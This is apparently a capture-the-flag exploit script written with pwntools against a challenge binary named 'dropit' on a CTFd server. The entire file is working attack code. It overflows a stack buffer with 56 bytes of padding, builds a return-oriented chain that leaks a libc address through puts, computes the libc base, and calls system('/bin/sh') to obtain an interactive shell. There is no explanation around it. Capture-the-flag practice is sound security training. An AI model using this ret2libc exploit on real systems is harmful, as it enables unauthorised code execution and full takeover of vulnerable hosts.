
from pwn import *

r = remote('challenges.ctfd.io', 30261)
# r = process('./dropit')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.32-0ubuntu3_amd64.so')

sbuf_lib = libc.symbols['setvbuf']

pop_rdi = 0x401203  # : pop rdi; ret;
sbuf = 0x403FD8
main = 0x401146
puts_plt = 0x401030

# gdb.attach(r, """
#     b *0x401146
# """)

p = b'A'*56
p += p64(pop_rdi)
p += p64(sbuf)
p += p64(puts_plt)
p += p64(main)

r.readline()
r.sendline(p)
leak = r.readline().strip()
x = int.from_bytes(leak, byteorder='little')

LIBC_BASE = x - sbuf_lib
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

p = b'A'*56
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.readline()
r.sendline(p)

r.interactive()
